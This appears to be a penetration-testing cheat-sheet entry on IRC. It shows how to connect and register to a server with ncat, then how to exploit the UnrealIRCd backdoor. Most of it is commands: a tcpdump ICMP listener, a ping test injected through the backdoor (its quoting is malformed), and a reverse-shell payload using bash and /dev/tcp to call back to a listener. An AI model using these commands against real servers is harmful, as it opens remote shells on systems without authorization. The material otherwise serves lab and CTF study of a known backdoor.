# IRC
> Internet Relay Chat is an application layer protocol that facilitates communication in the form of text. The chat process works on a client/server networking model.
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Internet_Relay_Chat)</cite>

## Authenticate

```bash
ncat <ip> <port>
```

```
PASS <anyPassword>
NICK <anyNickname>
USER <anyNickname> <anyServerName> AndComment :<anyComment>
```

## Backdoor in Unreal IRC

[A backdoor in UnrealIRCd LWN.net](https://lwn.net/Articles/392201/)  

Listen for icmp message
```bash
tcpdump -i tun0 icmp
```

Check if backdoor works
```bash
echo "AB; ping -c 1 <own-ip> | nc <target-ip> <port>
```

### Exploit it

```bash
ncat -lnvp <port>
echo "AB; bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" | ncat <target-ip> <port>
```
